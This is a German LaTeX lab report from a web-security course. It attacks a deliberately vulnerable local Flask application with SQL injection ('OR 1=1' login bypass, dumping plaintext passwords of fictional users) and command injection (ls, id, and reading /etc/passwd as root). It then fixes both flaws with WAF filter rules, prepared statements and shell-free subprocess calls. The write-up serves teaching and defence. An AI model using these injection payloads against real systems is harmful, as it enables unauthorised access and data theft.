\documentclass[
	fontsize=12pt,
	paper=a4,
	numbers=noenddot,
	listof=totoc,
	listof=entryprefix,
	listof=nochaptergap,
	bibliography=totoc,
	parskip=half,
	openany
]{scrbook}

\usepackage{cmap}


\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{ngerman}


\usepackage{scrhack}
\usepackage[table]{xcolor}
\usepackage{chngcntr}
\usepackage{enumitem}


\usepackage{amsthm}


\usepackage{lipsum}
\usepackage{unicode-math}


\usepackage{mathtools}


\usepackage[
	colorlinks=false,
	linkcolor=black,
	citecolor=black,
	filecolor=black,
	urlcolor=black,
	bookmarks=true,
	bookmarksopen=true,
	bookmarksopenlevel=3,
	bookmarksnumbered,
	plainpages=false,
	pdfpagelabels=true,
	hyperfootnotes
]{hyperref}


\renewcommand{\familydefault}{\sfdefault}
\usepackage[onehalfspacing]{setspace}
\raggedbottom

\usepackage{anyfontsize}

\addtokomafont{chapter}{\sffamily\large\bfseries}
\addtokomafont{section}{\sffamily\normalsize\bfseries}
\addtokomafont{subsection}{\sffamily\normalsize\mdseries}
\addtokomafont{caption}{\sffamily\normalsize\mdseries}

\usepackage{relsize}
\renewcommand*{\UrlFont}{\ttfamily\smaller\relax}


\usepackage[
	bindingoffset=0cm,
	inner=2.5cm,
	outer=2.5cm,
	top=3cm,
	bottom=2cm
]{geometry}

\usepackage[
	headsepline,
	plainheadsepline
]{scrlayer-scrpage}
\clearpairofpagestyles
\addtokomafont{pagehead}{\normalfont}
\ohead*{\thepage}
\ihead*{\leftmark}


\usepackage{graphicx}
\graphicspath{{pictures/}}
\usepackage{float}

\renewcommand{\thefigure}{\arabic{figure}}
\counterwithout{figure}{chapter}

\usepackage{wrapfig}


\usepackage{booktabs}
\usepackage{multirow}
\usepackage{tabularx}

\renewcommand{\thetable}{\arabic{table}}
\counterwithout{table}{chapter}


\usepackage{listings}
\usepackage{beramono}

\renewcommand{\lstlistlistingname}{List of Code Listings}
\renewcommand{\lstlistingname}{Code Listing}
\newcommand{\listoflolentryname}{\lstlistingname}

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.5,0,0.33}
\definecolor{codepurblue}{rgb}{0.16,0.0,1.0}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\lstdefinestyle{codestyle}{
	backgroundcolor=\color{backcolour},
	commentstyle=\color{codegreen},
	keywordstyle=\bfseries\color{codepurple},
	numberstyle=\tiny\color{codegray},
	stringstyle=\color{codepurblue},
	basicstyle=\scriptsize\ttfamily,
	breakatwhitespace=false,
	breaklines=true,
	captionpos=b,
	keepspaces=true,
	numbers=left,
	numbersep=5pt,
	showspaces=false,
	showstringspaces=false,
	showtabs=false,
	tabsize=2,
	escapeinside={(*@}{@*)}
}
\lstset{style=codestyle, numberbychapter=false}



\KOMAoptions{toc=chapterentrydotfill}
\addtokomafont{chapterentry}{\normalfont}
\setuptoc{toc}{totoc}

\DeclareTOCStyleEntry[beforeskip=0cm]{chapter}{chapter}
\DeclareTOCStyleEntry[beforeskip=0cm]{section}{section}
\DeclareTOCStyleEntry[beforeskip=0cm]{default}{subsection}

\BeforeStartingTOC[lof]{\def\autodot{:}}
\BeforeStartingTOC[lot]{\def\autodot{:}}
\BeforeStartingTOC[lol]{\def\autodot{:}}


\iffalse
\usepackage{csquotes}
\setlength\bibitemsep{.5\baselineskip}
\setcounter{biburlnumpenalty}{9000}
\setcounter{biburllcpenalty}{9000}
\setcounter{biburlucpenalty}{9000}

\fi

\usepackage[printonlyused]{acronym}


\usepackage[title,titletoc]{appendix}

\newcommand{\appendixchapter}[1]{
\cleardoublepage
\pagenumbering{arabic}
\renewcommand{\thepage}{\thechapter-\arabic{page}}
\chapter{#1}
}

\newcommand{\monthlyreport}[2]{
\section{#1}
\centering
\includegraphics[trim=55 35 55 35,clip,width=1\textwidth]{#2}
\clearpage
}



\newtheorem{beispiel}{Beispiel}

\newtheorem{these}{These}

\newtheorem{definition}{Definition}


\usepackage[nameinlink, noabbrev]{cleveref}


\lstset{
	extendedchars=true,
	inputencoding=utf8,
	literate=
		{ä}{{\"a}}1
		{ö}{{\"o}}1
		{ü}{{\"u}}1
		{ß}{{\ss}}1
		{Ä}{{\"A}}1
		{Ö}{{\"O}}1
		{Ü}{{\"U}}1
}

\begin{document}

\begin{titlepage}
	\pagestyle{empty}

	\begin{flushright}
		\begin{figure}[ht]
			\flushright
			\includegraphics[height=2cm]{../../for_latex/hfu}
		\end{figure}
	\end{flushright}

	\begin{center}
		\vspace{3cm}

		{\fontsize{22}{22} \selectfont \textbf{Blatt 2}}\\[5mm]
		{\fontsize{18}{18} \selectfont Web-Security und Intrusion Prevention}

		\vspace{12cm}

		{\fontsize{14}{14} \selectfont Luis Staudt}
	\end{center}
\end{titlepage}


\chapter*{Aufgabe 1--3: Die Webanwendung}

Die Anwendung ist eine Flask-Webseite mit SQLite-Benutzerdatenbank, die über
\texttt{docker compose up} gestartet wird. Ein zweiter Container (NginX) ist als
Reverse Proxy und damit als Web Application Firewall vorgesehen, zunächst jedoch
nicht aktiv konfiguriert. Benutzername und Passwort sind aus
\texttt{createSQLiteDB.py} bekannt, etwa \texttt{admin} / \texttt{password123}.
Ein regulärer Login funktioniert:

\begin{lstlisting}[language=bash]
curl "http://127.0.0.1:5000/?username=admin&password=password123"
-> Hallo Benutzer admin
\end{lstlisting}

Die Webseite weist zwei Schwachstellen auf: eine SQL-Injection im Login
(\texttt{HandleLogin.py}) und eine Command-Line-Injection unter \texttt{/time}
(\texttt{ShowDate.py}).

\chapter*{Aufgabe 4: SQL-Injection}

Die verwundbare Stelle baut den SQL-String durch String-Verkettung aus den
Benutzereingaben zusammen:

\begin{lstlisting}[language=Python]
query_string = ("SELECT * FROM user WHERE "
                "username = '" + username + "' AND password = '" + password + "'")
\end{lstlisting}

\section*{a) Authentifizierung umgehen}

Mit der Eingabe \texttt{' OR '1'='1} in beiden Feldern wird die
\texttt{WHERE}-Bedingung immer wahr:

\begin{lstlisting}[language=bash]
curl "http://127.0.0.1:5000/?username=x' OR '1'='1&password=y' OR '1'='1"
\end{lstlisting}

Der resultierende Query lautet:

\begin{lstlisting}[language=SQL]
SELECT * FROM user WHERE username = 'x' OR '1'='1' AND password = 'y' OR '1'='1'
\end{lstlisting}

Der Login gelingt damit ohne gültige Zugangsdaten.

\section*{b) Alle Zeilen der Datenbank anzeigen}

Da \texttt{OR '1'='1'} alle Zeilen zurückgibt und die Anwendung das vollständige
Ergebnis ausgibt, werden sämtliche Datensätze einschliesslich der
Klartextpasswörter sichtbar:

\begin{lstlisting}[language=bash]
[('admin', 'password123', 'admin@thecompany.org', '123 Admin St, Admin Town'),
 ('alice', 'IamAlice',    'alice@wonder.lands',   '1 Rabbit Hole, Fantasy Town'),
 ('bob',   'qwerty',      'bob@sideshow.org',     '42 Nowhere Blvd, Springfield'),
 ('eve',   'evil',        'info@evilcorp.com',    '666 Evil Avenue, Bad Land'),
 ('ttp',   'ITS4ever',    'trust@ttp.me',         '1 Trust Blvd, Trust Town')]
\end{lstlisting}

\chapter*{Aufgabe 5: Command-Line-Injection}

Unter \texttt{/time} wird der \texttt{format}-Parameter ungeprüft an eine Shell
angehängt:

\begin{lstlisting}[language=Python]
cmdlines = os.popen("date +"+format_string)
\end{lstlisting}

\section*{a) Inhalt des aktuellen Verzeichnisses anzeigen}

Mehrere Befehle lassen sich in der Shell mit dem Semikolon \texttt{;}
hintereinander ausführen, alternativ mit \texttt{\&\&}, \texttt{|} oder
\texttt{\$()}. Der Parameter \texttt{format=x;ls -la} führt damit nach
\texttt{date} zusätzlich \texttt{ls -la} aus:

\begin{lstlisting}[language=bash]
curl "http://127.0.0.1:5000/time?format=x;ls%20-la"
-> HandleLogin.py  PrettyPrint.py  ShowDate.py  app.py
   createSQLiteDB.py  users.db  __pycache__
\end{lstlisting}

\section*{b) Als welcher Benutzer?}

\begin{lstlisting}[language=bash]
curl "http://127.0.0.1:5000/time?format=x;id;whoami"
-> uid=0(root) gid=0(root) groups=0(root)
   root
\end{lstlisting}

Der Code läuft als \texttt{root} im Container. Die Injection erlaubt damit
beliebige Befehle mit Root-Rechten.

\section*{c) Inhalt von /etc/passwd}

\begin{lstlisting}[language=bash]
curl "http://127.0.0.1:5000/time?format=x;cat%20/etc/passwd"
-> root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   ...
   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
\end{lstlisting}

\chapter*{Aufgabe 6: Absicherung}

\section*{a) Zugriff nur über die WAF}

In \texttt{docker-compose.yml} wird die Port-Freigabe \texttt{5000:5000} des
Dienstes \texttt{website} entfernt. Dadurch ist die Webanwendung nur noch
containerintern erreichbar; von aussen führt der einzige Weg über den Proxy auf
Port 8080.

\begin{lstlisting}[language=bash]
website:
    build:
      dockerfile: Dockerfile.website
      context: ./
proxy:
    image: nginx
    ports:
      - "8080:8080"
\end{lstlisting}

Der Test bestätigt die Absicherung: \texttt{http://127.0.0.1:5000/} ist nicht
mehr erreichbar (Verbindung abgelehnt), \texttt{http://127.0.0.1:8080/}
funktioniert weiterhin.

\section*{b) SQL-Injection in der WAF filtern}

In \texttt{nginx-filter.conf} werden typische SQLi-Schlüsselwörter geblockt:

\begin{lstlisting}[language=bash]
if ($query_string ~* "('|%27| or | union | select |--|;)") { return 403; }
if ($request_uri   ~* "('|%27| or | union | select |--|;)") { return 403; }
\end{lstlisting}

Der Test zeigt die Wirkung:

\begin{lstlisting}[language=bash]
curl "http://127.0.0.1:8080/?username=x' OR '1'='1&password=y"
-> HTTP 403
\end{lstlisting}

\section*{c) GET vs. POST beim Login}

GET-Parameter stehen in der URL und landen damit im Browserverlauf, in Server-
und Proxy-Logs sowie im \texttt{Referer}-Header. Zugangsdaten werden auf diese
Weise unnötig an vielen Stellen gespeichert. Der Login wird daher auf POST
umgestellt, sodass Benutzername und Passwort im Request-Body stehen. In
\texttt{app.py} entfällt der GET-Zweig, in \texttt{HandleLogin.py} wird das
Formular auf \texttt{method='post'} gesetzt.

\section*{d) Prepared Statement}

Die eigentliche Ursache der SQL-Injection wird in \texttt{HandleLogin.py}
behoben. Die Eingaben werden nicht mehr in den SQL-Text eingesetzt, sondern als
Parameter übergeben:

\begin{lstlisting}[language=Python]
query_string = "SELECT * FROM user WHERE username = ? AND password = ?"
cur.execute(query_string, (username, password))
\end{lstlisting}

Die Eingabe \texttt{x' OR '1'='1} im POST-Body führt jetzt zu \glqq Login nicht
möglich\grqq{}, da sie als Literal behandelt wird und den Query nicht mehr
verändern kann.

\section*{e) Command-Line-Injection verhindern}

In \texttt{ShowDate.py} wird \texttt{os.popen} (Shell) durch
\texttt{subprocess.run} mit Argumentliste ersetzt. Das Format wird als ein
einzelnes Argument ohne Shell übergeben, sodass Metazeichen wie \texttt{;},
\texttt{|} oder \texttt{\$()} nicht mehr interpretiert werden.

\begin{lstlisting}[language=Python]
proc = subprocess.run(["date", "+" + format_string], capture_output=True, text=True)
\end{lstlisting}

Die Eingabe \texttt{format=x;cat /etc/passwd} liefert nun nur noch den literalen
String \texttt{x;cat /etc/passwd} als ungültiges Datumsformat, ohne Dateiausgabe.
Ein gültiges Format wie \texttt{\%H:\%M} funktioniert weiterhin.

\section*{f) Weitere Massnahmen}

\begin{itemize}
	\item Passwörter niemals im Klartext speichern, sondern gesalzen hashen,
	      etwa mit bcrypt oder argon2.
	\item Fehlermeldungen nicht den SQL-Query oder gespeicherte Daten ausgeben
	      lassen (Information Disclosure).
	\item Datenbankbenutzer mit minimalen Rechten statt \texttt{root}; Container
	      nicht als \texttt{root} laufen lassen (\texttt{USER}-Direktive).
	\item Eingabevalidierung und Whitelisting (etwa erlaubte Zeichen im
	      Datumsformat), Rate-Limiting und HTTPS.
\end{itemize}


\end{document}
